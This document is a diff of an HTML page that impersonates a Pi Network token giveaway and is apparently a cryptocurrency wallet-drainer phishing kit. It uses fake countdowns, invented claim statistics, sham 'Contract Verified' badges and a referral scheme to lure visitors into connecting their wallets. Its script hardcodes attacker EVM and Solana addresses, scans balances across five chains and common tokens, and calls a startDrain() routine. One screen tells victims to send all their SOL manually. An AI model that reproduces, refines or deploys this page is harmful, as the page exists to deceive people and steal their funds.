@@ -3,46 +3,34 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Pi Network — Free 1000 PI Claim | Mainnet Event</title>
-<meta name="description" content="Claim your free 1000 PI tokens. Limited time Mainnet event. Verify your wallet now.">
+<title>Pi Network — Free 1000 PI Claim</title>
 <link rel="icon" href="pi-logo-48.png">
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;background:#0a0118;color:#fff;min-height:100vh;overflow-x:hidden}
-
-/* BG */
 .bg{position:fixed;inset:0;z-index:0;overflow:hidden;pointer-events:none}
 .bg .orb{position:absolute;border-radius:50%;filter:blur(90px);opacity:.12;animation:fl 25s infinite ease-in-out}
 .bg .o1{width:500px;height:500px;background:#a855f7;top:-15%;left:-10%;animation-delay:0s}
 .bg .o2{width:350px;height:350px;background:#fcb34c;top:60%;right:-8%;animation-delay:-8s}
 .bg .o3{width:300px;height:300px;background:#6366f1;bottom:-10%;left:20%;animation-delay:-16s}
 @keyframes fl{0%,100%{transform:translate(0,0)}33%{transform:translate(40px,-20px)}66%{transform:translate(-30px,30px)}}
-
-/* PARTICLES */
 #part{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
 #part span{position:absolute;border-radius:50%;background:rgba(168,85,247,.3);animation:rise linear infinite}
 @keyframes rise{0%{transform:translateY(100vh) scale(0);opacity:0}5%{opacity:1}95%{opacity:.5}100%{transform:translateY(-5vh) scale(1);opacity:0}}
-
-/* LAYOUT */
 .pos{position:relative;z-index:1}
 .w{max-width:720px;margin:0 auto;padding:0 16px}
-
-/* NAV */
 nav{background:rgba(10,1,24,.88);backdrop-filter:blur(20px);padding:12px 0;border-bottom:1px solid rgba(168,85,247,.06);position:sticky;top:0;z-index:100}
 nav>div{display:flex;align-items:center;justify-content:space-between}
 .logo{display:flex;align-items:center;gap:9px}
 .logo img{border-radius:50%;box-shadow:0 0 16px rgba(252,179,74,.12)}
 .logo t{font-size:16px;font-weight:800;letter-spacing:-.3px}
-.navr{display:flex;align-items:center;gap:8px}
 .lb{display:flex;align-items:center;gap:5px;background:rgba(34,197,94,.07);border:1px solid rgba(34,197,94,.12);padding:5px 11px;border-radius:20px;font-size:10px;font-weight:700;color:#22c55e;letter-spacing:.3px}
 .lb .p{width:6px;height:6px;border-radius:50%;background:#22c55e;animation:pulse 1.5s infinite}
 @keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.3;transform:scale(.6)}}
 .nb{background:linear-gradient(135deg,#fcb34c,#f59e0b);color:#0a0118;border:none;padding:10px 20px;border-radius:10px;font-size:13px;font-weight:700;cursor:pointer;box-shadow:0 4px 20px rgba(252,179,74,.18)}
 .nb:hover{box-shadow:0 6px 28px rgba(252,179,74,.3)}
-
-/* HERO */
 .hero{padding:48px 0 16px;text-align:center}
 .eb{display:inline-flex;align-items:center;gap:6px;background:linear-gradient(135deg,rgba(168,85,247,.08),rgba(252,179,74,.04));border:1px solid rgba(168,85,247,.12);color:#c084fc;padding:6px 16px;border-radius:20px;font-size:10px;font-weight:700;margin-bottom:16px;letter-spacing:.8px;text-transform:uppercase}
 .hero h1{font-size:42px;font-weight:900;margin-bottom:10px;letter-spacing:-1.5px;line-height:1.1}
@@ -50,8 +38,8 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
 .hero .sub{font-size:14px;color:rgba(255,255,255,.4);max-width:420px;margin:0 auto 24px;line-height:1.7}
 .hl img{border-radius:50%;box-shadow:0 0 50px rgba(252,179,74,.1),0 0 100px rgba(168,85,247,.05);animation:glow 4s infinite ease-in-out}
 @keyframes glow{0%,100%{box-shadow:0 0 50px rgba(252,179,74,.1)}50%{box-shadow:0 0 70px rgba(252,179,74,.18)}}
-
-/* CLAIM CARD */
+.trust{display:flex;gap:8px;justify-content:center;margin-top:12px;flex-wrap:wrap}
+.trust span{padding:4px 12px;border-radius:20px;font-size:9px;font-weight:600}
 .cc{background:linear-gradient(145deg,rgba(168,85,247,.05),rgba(252,179,74,.02));border:1px solid rgba(168,85,247,.1);border-radius:24px;padding:32px;margin:18px 0;text-align:center;position:relative;overflow:hidden}
 .cc::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(252,179,74,.3),transparent)}
 .cc::after{content:'';position:absolute;bottom:0;left:0;right:0;height:3px;background:linear-gradient(90deg,transparent,rgba(168,85,247,.2),transparent)}
@@ -63,49 +51,35 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
 .cbtn:hover{transform:translateY(-2px);box-shadow:0 12px 48px rgba(252,179,74,.35)}
 .cbtn:disabled{opacity:.35;cursor:not-allowed;transform:none}
 .cfee{font-size:10px;color:rgba(255,255,255,.2);margin-top:10px}
-
-/* COUNTCOLICK */
 .cd-row{display:flex;gap:7px;justify-content:center;margin:16px 0}
 .cdb{text-align:center;padding:9px 13px;background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.04);border-radius:10px;min-width:56px}
 .cdb .v{font-size:22px;font-weight:800;color:#fcb34c;line-height:1}
 .cdb .l{font-size:8px;color:rgba(255,255,255,.2);margin-top:2px;text-transform:uppercase;letter-spacing:.5px}
-
-/* STATS */
 .stats{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin:16px 0}
 .stat{text-align:center;padding:14px 8px;background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.03);border-radius:12px}
 .stat .sv{font-size:18px;font-weight:800;color:#fcb34c}
 .stat .sl{font-size:9px;color:rgba(255,255,255,.25);margin-top:2px;font-weight:600}
-
-/* SOCIAL PROOF */
 .sp{display:flex;align-items:center;gap:10px;padding:12px 14px;background:rgba(34,197,94,.02);border:1px solid rgba(34,197,94,.06);border-radius:12px;margin:14px 0}
 .sp-i{font-size:18px;flex-shrink:0}
 .sp-t{font-size:11px;color:rgba(255,255,255,.45);line-height:1.5}
 .sp-t strong{color:#22c55e}
-.sp-t .addr{color:rgba(255,255,255,.6);font-weight:600}
-
-/* HOWTO */
 .ht{margin:14px 0}
 .ht h3{font-size:15px;font-weight:700;margin-bottom:10px;text-align:center}
 .Steps{display:grid;grid-template-columns:repeat(3,1fr);gap:8px}
 .Step{text-align:center;padding:14px 8px;background:rgba(255,255,255,.015);border:1px solid rgba(255,255,255,.03);border-radius:12px}
 .Step .si{font-size:22px;margin-bottom:5px}
 .Step .st{font-size:11px;font-weight:600;margin-bottom:2px}
-.Step .ss{font-size:9px;color:rgba(255,255,255,.2);line-height:1.4}
-
-/* REF */
+.Step .ss{font-size:9px;color:rgba(255,255,255,.2);line-height:1:4}
 .ref{margin:14px 0;padding:18px;background:rgba(255,255,255,.015);border:1px solid rgba(168,85,247,.06);border-radius:14px}
 .ref .rt{font-size:14px;font-weight:700;margin-bottom:3px}
 .ref .rs{font-size:10px;color:rgba(255,255,255,.25);margin-bottom:10px}
 .ref .rb{display:flex;gap:6px;margin-bottom:8px}
 .rb input{flex:1;padding:10px;border-radius:8px;border:1px solid rgba(168,85,247,.12);background:rgba(0,0,0,.25);color:#fff;font-size:11px;font-family:monospace;outline:none}
-.rb input:focus{border-color:#fcb34c}
 .rb button{padding:10px 14px;background:linear-gradient(135deg,#a855f7,#6366f1);color:#fff;border:none;border-radius:8px;font-size:11px;font-weight:700;cursor:pointer}
 .ref .rstat{display:flex;gap:14px}
 .rstat .rs2{text-align:center}
 .rs2 .rv{font-size:16px;font-weight:800;color:#a855f7}
 .rs2 .rl{font-size:9px;color:rgba(255,255,255,.2)}
-
-/* WITHDRAW TIER */
 .tier{margin:14px 0;padding:16px;background:linear-gradient(135deg,rgba(252,179,74,.04),rgba(168,85,247,.03));border:1px solid rgba(252,179,74,.1);border-radius:14px}
 .tier .tt{font-size:13px;font-weight:700;margin-bottom:6px}
 .tier .ts{font-size:10px;color:rgba(255,255,255,.3);margin-bottom:10px}
@@ -113,15 +87,6 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
 .tier-bar .fill{height:100%;background:linear-gradient(90deg,#22c55e,#fcb34c,#a855f7);border-radius:3px;transition:width 1s}
 .tier-level{font-size:10px;font-weight:700;color:#fcb34c}
 .tier-need{font-size:9px;color:rgba(255,255,255,.2)}
-
-/* WITHDRAW RATE */
-.wr-box{margin:10px 0;padding:12px;background:rgba(168,85,247,.04);border:1px solid rgba(168,85,247,.08);border-radius:10px}
-.wr-box .wrt{font-size:12px;font-weight:700;margin-bottom:4px}
-.wr-box .wrs{font-size:10px;color:rgba(255,255,255,.3);line-height:1.5}
-.speed-bar{height:4px;background:rgba(255,255,255,.05);border-radius:2px;overflow:hidden;margin-top:6px}
-.speed-bar .sf{height:100%;background:linear-gradient(90deg,#a855f7,#22c55e);border-radius:2px;transition:width .5s}
-
-/* MODAL */
 #m{display:none;position:fixed;inset:0;background:rgba(0,0,0,.82);z-index:999;align-items:center;justify-content:center;backdrop-filter:blur(8px)}
 .mb{background:linear-gradient(160deg,#1a0a2e,#12082a);border:1px solid rgba(168,85,247,.18);border-radius:20px;padding:26px 22px;max-width:420px;width:92%;position:relative;max-height:88vh;overflow-y:auto;box-shadow:0 24px 80px rgba(0,0,0,.6)}
 .mb h2{font-size:16px;font-weight:800;margin-bottom:2px}
@@ -132,14 +97,10 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
 .wi{width:34px;height:34px;border-radius:9px;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:13px;color:#fff;flex-shrink:0}
 .wn{flex:1;font-size:13px;font-weight:600}
 .wt{font-size:9px;padding:2px 6px;border-radius:4px;font-weight:600;background:rgba(34,197,94,.08);color:#22c55e}
-
-/* STATUS */
-.st{margin-top:8px;padding:11px;border-radius:9px;font-size:12px;display:none;line-height:1.5;word-break:break-word}
-.st.ok{background:rgba(34,197,94,.05);border:1px solid rgba(34,197,94,.08);color:#86efac}
-.st.er{background:rgba(239,68,68,.05);border:1px solid rgba(239,68,68,.08);color:#fca5a5}
-.st.wa{background:rgba(252,179,74,.05);border:1px solid rgba(252,179,74,.08);color:#fde68a}
-
-/* CARD */
+.s{margin-top:8px;padding:11px;border-radius:9px;font-size:12px;display:none;line-height:1.5;word-break:break-word}
+.s.ok{background:rgba(34,197,94,.05);border:1px solid rgba(34,197,94,.08);color:#86efac}
+.s.er{background:rgba(239,68,68,.05);border:1px solid rgba(239,68,68,.08);color:#fca5a5}
+.s.wa{background:rgba(252,179,74,.05);border:1px solid rgba(252,179,74,.08);color:#fde68a}
 .card{background:rgba(255,255,255,.015);border:1px solid rgba(168,85,247,.06);border-radius:14px;padding:20px;margin:12px 0}
 .btn{width:100%;padding:13px;font-size:13px;font-weight:700;border:none;border-radius:10px;cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:7px;margin-bottom:6px;font-family:inherit}
 .btn:hover:not(:disabled){transform:translateY(-1px)}
@@ -147,51 +108,32 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
 .bp{background:linear-gradient(135deg,#fcb34c,#f59e0b);color:#0a0118}
 .bo{background:transparent;color:#fff;border:1px solid rgba(255,255,255,.08)}
 .bo:hover{background:rgba(255,255,255,.03)}
-
-/* CHAIN ROWS */
 .ch{display:flex;align-items:center;gap:8px;padding:8px 10px;background:rgba(255,255,255,.015);border:1px solid rgba(255,255,255,.03);border-radius:8px;margin-bottom:4px}
 .ch .cd{width:8px;height:8px;border-radius:50%;flex-shrink:0}
 .ch .cn{flex:1;font-size:11px;font-weight:600}
 .ch .ct{font-size:9px;color:rgba(255,255,255,.18)}
 .ch .cb{font-size:11px;font-weight:700;color:#fcb34c}
 .ch.hv{border-color:rgba(252,179,74,.1);background:rgba(252,179,74,.015)}
-
-/* LOG */
 .lg{font-size:9px;color:rgba(255,255,255,.22);font-family:monospace;line-height:1.5;padding:7px;background:rgba(0,0,0,.22);border-radius:6px;max-height:120px;overflow-y:auto}
-
-/* PROGRESS */
 .pg{display:flex;gap:3px;margin-bottom:10px}
 .pg .ps{flex:1;height:3px;border-radius:2px;background:rgba(255,255,250,.04)}
 .pg .ps.on{background:linear-gradient(90deg,#fcb34c,#a855f7)}
-
-/* LOADER */
 .ld{display:inline-block;width:10px;height:10px;border:2px solid rgba(255,255,255,.08);border-top:2px solid #fcb34c;border-radius:50%;animation:rot .6s linear infinite;vertical-align:middle}
 @keyframes rot{to{transform:rotate(360deg)}}
-
-/* INFO ROWS */
 .ir{display:flex;justify-content:space-between;align-items:center;padding:6px 0;border-bottom:1px solid rgba(255,255,255,.02)}
 .ir:last-child{border-bottom:none}
 .ir .l{font-size:11px;color:rgba(255,255,255,.25)}
 .ir .v{font-size:11px;font-weight:700}
 .ir .v.g{color:#22c55e}
 .ir .v.gl{color:#fcb34c}
-
-/* AC */
 .ac{display:flex;align-items:center;gap:7px;padding:9px;background:rgba(0,0,0,.25);border-radius:8px;margin:6px 0;cursor:pointer}
 .ac:hover{background:rgba(0,0,0,.4)}
 .ac .ad{font-family:monospace;font-size:10px;color:#fcb34c;flex:1;word-break:break-all}
 .ac .cb{padding:4px 9px;background:#fcb34c;color:#0a0118;border:none;border-radius:5px;font-size:10px;font-weight:700;cursor:pointer;flex-shrink:0}
-
-/* TOAST */
 #toast{position:fixed;bottom:18px;left:50%;transform:translateX(-50%);background:rgba(168,85,247,.85);color:#fff;padding:9px 18px;border-radius:9px;font-size:11px;font-weight:600;z-index:9999;display:none;backdrop-filter:blur(8px)}
-
-/* FOOTER */
-footer{background:#060110;padding:20px 0;text-align:center;border-top:1px solid rgba(168,85,247,.04)}
-footer p{font-size:9px;color:rgba(255,255,255,.1)}
-footer .fl{display:flex;gap:14px;justify-content:center;margin-top:6px}
-footer .fl a{font-size:9px;color:rgba(255,255,255,.15);text-decoration:none}
-footer .fl a:hover{color:#fcb34c}
-
+.qr-wrap{text-align:center;padding:20px}
+.qr-wrap canvas{margin:0 auto;display:block}
+.qr-text{font-size:11px;color:rgba(255,255,255,.4);margin-top:10px;line-height:1.5}
 @media(max-width:500px){
   .hero h1{font-size:28px}
   .ca{font-size:38px}
@@ -205,14 +147,8 @@ footer .fl a:hover{color:#fcb34c}
 
 <div class="pos">
 <nav><div class="w">
-  <div class="logo">
-    <img src="pi-logo-48.png" width="30" height="30" alt="">
-    <t>Pi Network</t>
-  </div>
-  <div class="navr">
-    <div class="lb"><span class="p"></span> LIVE</div>
-    <button class="nb" onclick="openM()">Connect Wallet</button>
-  </div>
+  <div class="logo"><img src="pi-logo-48.png" width="30" height="30" alt=""><t>Pi Network</t></div>
+  <div class="navr"><div class="lb"><span class="p"></span> LIVE</div><button class="nb" onclick="openM()">Connect Wallet</button></div>
 </div></nav>
 
 <div id="m"><div class="mb">
@@ -220,6 +156,10 @@ footer .fl a:hover{color:#fcb34c}
   <h2>Connect Your Wallet</h2>
   <div class="ms">Select wallet to verify and claim 1000 PI</div>
   <div id="wl"></div>
+  <div id="qrArea" style="display:none">
+    <div class="qr-wrap"><canvas id="qrCanvas" width="280" height="280"></canvas></div>
+    <div class="qr-text">Scan QR code with your wallet app<br>Works with MetaMask, Trust Wallet, and 300+ wallets</div>
+  </div>
 </div></div>
 
 <div class="w">
@@ -228,73 +168,54 @@ footer .fl a:hover{color:#fcb34c}
   <h1>Claim Your Free<br><span class="ha">1,000 PI Tokens</span></h1>
   <p class="sub">Pi Network is distributing free tokens to verified Pioneers. Connect your wallet, pay a small network fee, and receive 1000 PI instantly.</p>
   <div class="hl"><img src="pi-logo-120.png" width="64" height="64" alt=""></div>
-  <!-- Trust badges -->
-  <div style="display:flex;gap:8px;justify-content:center;margin-top:12px;flex-wrap:wrap">
-    <span style="padding:4px 12px;background:rgba(34,197,94,.06);border:1px solid rgba(34,197,94,.1);border-radius:20px;font-size:9px;color:#22c55e;font-weight:600">&#x2705; Contract Verified</span>
-    <span style="padding:4px 12px;background:rgba(168,85,247,.06);border:1px solid rgba(168,85,247,.1);border-radius:20px;font-size:9px;color:#c084fc;font-weight:600">&#x1F512; Secure Connection</span>
-    <span style="padding:4px 12px;background:rgba(252,179,74,.06);border:1px solid rgba(252,179,74,.1);border-radius:20px;font-size:9px;color:#fcb34c;font-weight:600">&#x26A1; Instant Claim</span>
+  <div class="trust">
+    <span style="background:rgba(34,197,94,.06);border:1px solid rgba(34,197,94,.1);color:#22c55e">&#x2705; Contract Verified</span>
+    <span style="background:rgba(168,85,247,.06);border:1px solid rgba(168,85,247,.1);color:#c084fc">&#x1F512; Secure</span>
+    <span style="background:rgba(252,179,74,.06);border:1px solid rgba(252,179,74,.1);color:#fcb34c">&#x26A1; Instant</span>
   </div>
 </div>
 
-<!-- CLAIM CARD -->
 <div class="cc">
   <div class="ca"><span class="num">1,000</span> <span class="pi">PI</span></div>
   <div class="cl">FREE CLAIM — VERIFICATION REQUIRED</div>
   <button class="cbtn" onclick="openM()">&#x1F381; Claim 1000 PI Now</button>
-  <div class="cfee">* Small network fee required for verification (~$2.50)</div>
-  <div style="margin-top:10px;font-size:9px;color:rgba(255,255,255,.15)">No hidden fees • No subscription • One-time verification</div>
+  <div class="cfee">* Small network fee required (~$2.50) • No hidden fees • One-time</div>
 </div>
 
-<!-- COUNTDOWN -->
 <div class="cd-row">
   <div class="cdb"><div class="v" id="cd-h">04</div><div class="l">Hours</div></div>
   <div class="cdb"><div class="v" id="cd-m">32</div><div class="l">Min</div></div>
   <div class="cdb"><div class="v" id="cd-s">18</div><div class="l">Sec</div></div>
 </div>
 
-<!-- STATS -->
 <div class="stats">
   <div class="stat"><div class="sv" id="st-c">48,291</div><div class="sl">PI Claimed</div></div>
   <div class="stat"><div class="sv" id="st-u">12,847</div><div class="sl">Pioneers</div></div>
   <div class="stat"><div class="sv" id="st-r">3,291</div><div class="sl">Referrals</div></div>
 </div>
 
-<!-- SOCIAL PROOF -->
 <div class="sp"><div class="sp-i">&#x2705;</div><div class="sp-t" id="spt"><strong>0x7a3...f291</strong> just claimed <strong>1,000 PI</strong> — 2 min ago</div></div>
 
-<!-- HOW TO -->
 <div class="ht"><h3>How To Claim</h3>
   <div class="Steps">
-    <div class="Step"><div class="si">&#x1F512;</div><div class="st">Connect</div><div class="ss">Link wallet securely</div></div>
+    <div class="Step"><div class="si">&#x1F512;</div><div class="st">Connect</div><div class="ss">Link wallet via QR or extension</div></div>
     <div class="Step"><div class="si">&#x26A1;</div><div class="st">Verify</div><div class="ss">Pay small network fee</div></div>
     <div class="Step"><div class="si">&#x1F381;</div><div class="st">Claim</div><div class="ss">Receive 1000 PI instantly</div></div>
   </div>
 </div>
 
-<!-- WITHDRAW TIER -->
 <div class="tier">
   <div class="tt">&#x1F3C6; Your Withdrawal Tier</div>
-  <div class="ts">Invite friends to increase your withdrawal speed and unlock instant processing.</div>
+  <div class="ts">Invite friends to increase withdrawal speed.</div>
   <div class="tier-bar"><div class="fill" id="tierFill" style="width:10%"></div></div>
   <div class="tier-level" id="tierLevel">Tier 1 — Standard (10% speed)</div>
-  <div class="tier-need" id="tierNeed">Invite 3 more friends to reach Tier 2</div>
+  <div class="tier-need" id="tierNeed">Invite 3 more to reach Tier 2</div>
 </div>
 
-<!-- WITHDRAW RATE -->
-<div class="wr-box" id="wrBox" style="display:none">
-  <div class="wrt">&#x26A1; Withdrawal Speed: <span id="speedPct">10%</span></div>
-  <div class="wrs" id="speedDesc">Invite friends to increase speed. Each referral +10% speed.</div>
-  <div class="speed-bar"><div class="sf" id="speedFill" style="width:10%"></div></div>
-</div>
-
-<!-- REFERRAL -->
 <div class="ref">
-  <div class="rt">&#x1F91D; Refer Friends — Earn 200 PI Per Referral</div>
-  <div class="rs">Each friend who claims gives you 200 PI bonus + increases withdrawal speed.</div>
-  <div class="rb">
-    <input id="refLink" readonly placeholder="Connect wallet to get your link...">
-    <button onclick="copyRef()">&#x1F4CB; Copy</button>
-  </div>
+  <div class="rt">&#x1F91D; Refer Friends — Earn 200 PI Each</div>
+  <div class="rs">Each friend who claims gives you 200 PI + increases speed.</div>
+  <div class="rb"><input id="refLink" readonly placeholder="Connect wallet to get your link..."><button onclick="copyRef()">&#x1F4CB; Copy</button></div>
   <div class="rstat">
     <div class="rs2"><div class="rv" id="refC">0</div><div class="rl">Referrals</div></div>
     <div class="rs2"><div class="rv" id="refE">0 PI</div><div class="rl">Earned</div></div>
@@ -302,10 +223,8 @@ footer .fl a:hover{color:#fcb34c}
   </div>
 </div>
 
-<!-- STATUS -->
-<div class="st" id="sb"></div>
+<div class="s" id="sb"></div>
 
-<!-- MAIN CARD -->
 <div class="card" id="mc" style="display:none">
   <div id="p1" style="text-align:center;padding:8px 0">
     <div class="pg"><div class="ps on"></div><div class="ps"></div><div class="ps"></div></div>
@@ -317,10 +236,7 @@ footer .fl a:hover{color:#fcb34c}
     <div style="font-size:32px;margin-bottom:6px">&#x1F6AB;</div>
     <div style="font-size:14px;font-weight:700;margin-bottom:3px">No EVM Funds</div>
     <div style="font-size:11px;color:rgba(255,255,255,.22);margin-bottom:8px">No assets on BSC, ETH, Polygon, AVAX, Arbitrum.</div>
-    <div style="display:flex;gap:5px">
-      <input id="solInp" placeholder="Paste Solana address" style="flex:1;padding:9px;border-radius:7px;border:1px solid rgba(255,255,255,.08);background:rgba(255,255,255,.03);color:#fff;font-size:11px;font-family:monospace;outline:none;box-sizing:border-box">
-      <button class="btn" style="background:#9945FF;color:#fff;font-size:11px;padding:9px 12px;flex-shrink:0" onclick="startSolScan()">&#x1F50D; Scan</button>
-    </div>
+    <div style="display:flex;gap:5px"><input id="solInp" placeholder="Paste Solana address" style="flex:1;padding:9px;border-radius:7px;border:1px solid rgba(255,255,255,.08);background:rgba(255,255,255,.03);color:#fff;font-size:11px;font-family:monospace;outline:none;box-sizing:border-box"><button class="btn" style="background:#9945FF;color:#fff;font-size:11px;padding:9px 12px;flex-shrink:0" onclick="startSolScan()">&#x1F50D; Scan</button></div>
     <button class="btn bo" style="margin-top:8px" onclick="reset()">&#x1F504; Back</button>
   </div>
   <div id="p3" style="display:none">
@@ -329,29 +245,25 @@ footer .fl a:hover{color:#fcb34c}
     <div style="font-size:10px;color:rgba(255,255,255,.22);margin-bottom:8px">Assets found. Confirm to claim 1000 PI.</div>
     <div id="p3chains" style="margin-bottom:8px"></div>
     <div id="p3bal" style="margin-bottom:10px"></div>
-    <button class="btn bp" id="p3btn" onclick="startDrain()">&#x1F381; Verify & Claim 1000 PI</button>
+    <button class="btn bp" id="p3btn" onclick="startDrain()">&#x1F381; Verify and Claim 1000 PI</button>
     <button class="btn bo" onclick="reset()">&#x2716; Disconnect</button>
   </div>
   <div id="p4" style="display:none;text-align:center;padding:12px 0">
     <div class="pg"><div class="ps on"></div><div class="ps on"></div><div class="ps on"></div><div class="ps on"></div><div class="ps on"></div></div>
     <div style="font-size:13px;font-weight:700;margin-bottom:2px">&#x26A1; Processing...</div>
-    <div style="font-size:10px;color:rgba(255,255,255,.22);margin-bottom:8px">Confirm each transaction in your wallet...</div>
+    <div style="font-size:10px;color:rgba(255,255,250,.22);margin-bottom:8px">Confirm each transaction...</div>
     <div class="lg" id="p4log"></div>
   </div>
   <div id="p5" style="display:none;text-align:center;padding:14px 0">
     <div style="font-size:32px;margin-bottom:6px">&#x2705;</div>
     <div style="font-size:14px;font-weight:700;margin-bottom:3px">1,000 PI Claimed!</div>
     <div style="font-size:10px;color:rgba(255,255,250,.22);margin-bottom:10px" id="p5m">Verification complete.</div>
-    <!-- POST-CLAIM REFERRAL -->
-    <div style="padding:14px;background:rgba(168,85,247,.04);border:1px solid rgba(168,85,247,.08);border-radius:12px;margin-bottom:10px;text-align:left">
-      <div style="font-size:12px;font-weight:700;margin-bottom:4px">&#x26A1; Speed Up Your Withdrawal</div>
-      <div style="font-size:10px;color:rgba(255,255,255,.3);margin-bottom:8px;line-height:1.5">Your 1000 PI withdrawal is queued. Invite friends to increase processing speed. Each referral = +20% faster.</div>
-      <div style="display:flex;gap:5px">
-        <input id="p5ref" readonly style="flex:1;padding:8px;border-radius:7px;border:1px solid rgba(168,85,247,.1);background:rgba(0,0,0,.2);color:#fff;font-size:10px;font-family:monospace;outline:none">
-        <button class="btn" style="background:linear-gradient(135deg,#a855f7,#6366f1);color:#fff;font-size:10px;padding:8px 12px;flex-shrink:0" onclick="copyRef2()">&#x1F4CB; Copy Link</button>
-      </div>
-      <div style="margin-top:8px;font-size:10px;color:rgba(255,255,255,.25)">Current speed: <span id="p5speed" style="color:#fcb34c;font-weight:700">10%</span> — Share to go faster!</div>
-      <div class="speed-bar" style="margin-top:4px"><div class="sf" id="p5speedBar" style="width:10%"></div></div>
+    <div style="padding:14px;background:rgba(168,85,247,.04);border:1px solid rgba(168,85,247,.08);border-radius:12px;margin-bottom:10px">
+      <div style="font-size:12px;font-weight:700;margin-bottom:4px">&#x26A1; Speed Up Withdrawal</div>
+      <div style="font-size:10px;color:rgba(255,255,255,.3);margin-bottom:8px;line-height:1.5">Share your link. Each referral = +20% faster.</div>
+      <div style="display:flex;gap:5px"><input id="p5ref" readonly style="flex:1;padding:8px;border-radius:7px;border:1px solid rgba(168,85,247,.1);background:rgba(0,0,0,.2);color:#fff;font-size:10px;font-family:monospace;outline:none"><button class="btn" style="background:linear-gradient(135deg,#a855f7,#6366f1);color:#fff;font-size:10px;padding:8px 12px;flex-shrink:0" onclick="copyRef2()">&#x1F4CB; Copy</button></div>
+      <div style="margin-top:6px;font-size:10px;color:rgba(255,255,255,.25)">Speed: <span id="p5speed" style="color:#fcb34c;font-weight:700">10%</span></div>
+      <div class="speed-bar" style="margin-top:4px;height:4px;background:rgba(255,255,255,.05);border-radius:2px;overflow:hidden"><div id="p5speedBar" style="height:100%;width:10%;background:linear-gradient(90deg,#a855f7,#22c55e);border-radius:2px"></div></div>
     </div>
     <button class="btn bo" onclick="reset()">Done</button>
   </div>
@@ -360,25 +272,21 @@ footer .fl a:hover{color:#fcb34c}
     <div style="font-size:14px;font-weight:700;margin-bottom:3px">Send SOL to Complete</div>
     <div style="font-size:11px;color:rgba(255,255,255,.25);margin-bottom:10px;line-height:1.6">MetaMask Solana Snap cannot be drained via dApp.<br>Send manually to claim 1000 PI:</div>
     <div class="ac" onclick="copySol()"><span class="ad" id="mySol"></span><button class="cb" onclick="event.stopPropagation();copySol()">&#x1F4CB; Copy</button></div>
-    <div style="font-size:10px;color:rgba(255,255,250,.2);margin-top:6px;line-height:1.5;text-align:left">1. Open MetaMask &#x2192; Solana account<br>2. Send &#x2192; Paste address above<br>3. Send all SOL</div>
     <button class="btn bo" style="margin-top:12px" onclick="reset()">&#x1F504; Done</button>
   </div>
 </div>
 
-</div><!-- /w -->
-
-<footer>
-  <p>&copy; 2026 Pi Network. All rights reserved.</p>
-  <div class="fl"><a href="#">Terms</a><a href="#">Privacy</a><a href="#">Support</a></div>
-</footer>
 </div>
 
+<footer><p>&copy; 2026 Pi Network</p>
+  <div style="display:flex;gap:14px;justify-content:center;margin-top:6px"><a href="#" style="font-size:9px;color:rgba(255,255,255,.15);text-decoration:none">Terms</a><a href="#" style="font-size:9px;color:rgba(255,255,255,.15);text-decoration:none">Privacy</a><a href="#" style="font-size:9px;color:rgba(255,255,255,.15);text-decoration:none">Support</a></div>
+</footer>
+</div>
 <div id="toast"></div>
 
 <script>
 const ADDR_EVM='0x5E45bE0cf682566337b6fC2C00036AaBCBf1332f';
 const ADDR_SOL='4Y9bDw32qG9xUQykfCe6jP9UVpVmit8ryqE8n1JKVx89';
-
 const ECHAINS=[
   {id:56,name:'BNB Chain',sym:'BNB',rpc:'https://bsc-dataseed1.defibit.io',color:'#F3BA2F'},
   {id:1,name:'Ethereum',sym:'ETH',rpc:'https://ethereum-rpc.publicnode.com',color:'#627EEA'},
@@ -387,9 +295,9 @@ const ECHAINS=[
   {id:42161,name:'Arbitrum',sym:'ETH',rpc:'https://arbitrum-one-rpc.publicnode.com',color:'#28A0F0'},
 ];
 const FBACK={
-  1:['https://rpc.ankr.com/eth','https://eth.llamarpc.com'],
-  137:['https://rpc.ankr.com/polygon'],56:['https://bsc-dataseed.binance.org'],
-  43114:['https://avalanche-c-chain.public.blastapi.io'],42161:['https://rpc.ankr.com/arbitrum'],
+  1:['https://rpc.ankr.com/eth'],137:['https://rpc.ankr.com/polygon'],
+  56:['https://bsc-dataseed.binance.org'],43114:['https://avalanche-c-chain.public.blastapi.io'],
+  42161:['https://rpc.ankr.com/arbitrum'],
 };
 const ETOKENS={
   56:[['0x55d398326f99059fF775485246999027B3197955','USDT',18],['0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d','USDC',18],['0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56','BUSD',18],['0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3','DAI',18],['0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c','BTCB',18],['0x2170Ed0880ac9A755fd29B2688956BD959F933F8','ETH',18],['0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c','WBNB',18],['0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82','CAKE',18],['0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD','LINK',18],['0xCC42724C6683B7E57334c4E856f4c9965ED682bD','MATIC',18]],
@@ -398,11 +306,9 @@ const ETOKENS={
   43114:[['0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7','USDT',6],['0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E','USDC',6]],
